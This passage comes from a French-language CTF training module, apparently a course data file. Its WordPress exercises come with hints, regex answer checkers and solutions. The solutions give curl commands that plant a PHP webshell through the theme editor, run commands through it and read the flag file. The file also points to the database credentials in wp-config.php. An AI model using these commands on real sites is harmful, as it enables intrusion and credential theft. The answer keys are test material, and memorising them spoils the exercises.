      task: "Envoyez un POST à <code>theme-editor.php</code> avec <code>action=update</code>, <code>file=404.php</code>, <code>theme=twentytwentyfour</code>, le nonce et un contenu PHP qui exécute <code>$_GET['cmd']</code>.",
      hint: "Utilisez <code>curl -b evidence/cookies.txt -X POST --data-urlencode</code> pour chaque champ.",
      accept: [/curl\s+-s\s+-b\s+evidence\/cookies\.txt\s+-X\s+POST\s+http:\/\/blog\.ctf\.lab\/wp-admin\/theme-editor\.php.*action=update.*file=404\.php.*theme=twentytwentyfour.*_wpnonce.*newcontent/is],
      solution: 'curl -s -b evidence/cookies.txt -X POST http://blog.ctf.lab/wp-admin/theme-editor.php --data-urlencode "action=update" --data-urlencode "file=404.php" --data-urlencode "theme=twentytwentyfour" --data-urlencode "_wpnonce=$NONCE" --data-urlencode \'newcontent=<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>\'',
      output: ['File edited successfully.'],
      read: "Le fichier du thème est modifié. Le code PHP s'exécutera à chaque requête sur <code>404.php</code> avec le paramètre <code>cmd</code>.",
      pivot: "Appelez le webshell avec <code>id</code> pour confirmer l'exécution, puis lisez le flag. Restaurez ensuite le fichier original."
    },
    {
      id: 'm10-e11',
      title: 'Vérifier l\'exécution de commandes',
      context: "Le webshell est en place. Vous devez prouver l'exécution sous l'utilisateur du serveur web.",
      task: "Appelez <code>404.php?cmd=id</code> et affichez la réponse.",
      hint: "Utilisez <code>curl -s 'http://blog.ctf.lab/wp-content/themes/twentytwentyfour/404.php?cmd=id'</code>.",
      accept: [/curl\s+-s\s+["']http:\/\/blog\.ctf\.lab\/wp-content\/themes\/twentytwentyfour\/404\.php\?cmd=id["']/i],
      solution: 'curl -s "http://blog.ctf.lab/wp-content/themes/twentytwentyfour/404.php?cmd=id"',
      output: ['uid=33(www-data) gid=33(www-data) groups=33(www-data)'],
      read: "L'exécution est confirmée sous <code>www-data</code>. Ce compte n'est pas root : une élévation de privilèges peut être nécessaire pour aller plus loin.",
      pivot: "Lisez le flag applicatif, puis cherchez les identifiants de base dans wp-config.php si le périmètre le permet."
    },
    {
      id: 'm10-e12',
      title: 'Capturer le flag final WordPress',
      context: "Le fichier <code>/var/www/html/flag.txt</code> contient le flag final du scénario.",
      task: "Utilisez le webshell pour lire <code>/var/www/html/flag.txt</code> et enregistrez la réponse dans <code>evidence/flag.txt</code>.",
      hint: "Utilisez <code>?cmd=cat+/var/www/html/flag.txt</code> avec une redirection.",
      accept: [/curl\s+-s\s+["'].*404\.php\?cmd=cat\+\/var\/www\/html\/flag\.txt["']\s*\|?\s*tee\s+evidence\/flag\.txt/i],
      solution: 'curl -s "http://blog.ctf.lab/wp-content/themes/twentytwentyfour/404.php?cmd=cat+/var/www/html/flag.txt" | tee evidence/flag.txt',
      output: ['FLAG{WP_ADMIN_RCE}'],
      read: "Le flag final confirme l'exécution de code et la compromission du site. L'impact inclut la base de données via wp-config.php.",
      pivot: "Documentez la chaîne : version → utilisateurs → plugin → mot de passe → admin → éditeur → RCE → flag. Proposez le durcissement complet."
    }
  ],
  quiz: 'q10'
};
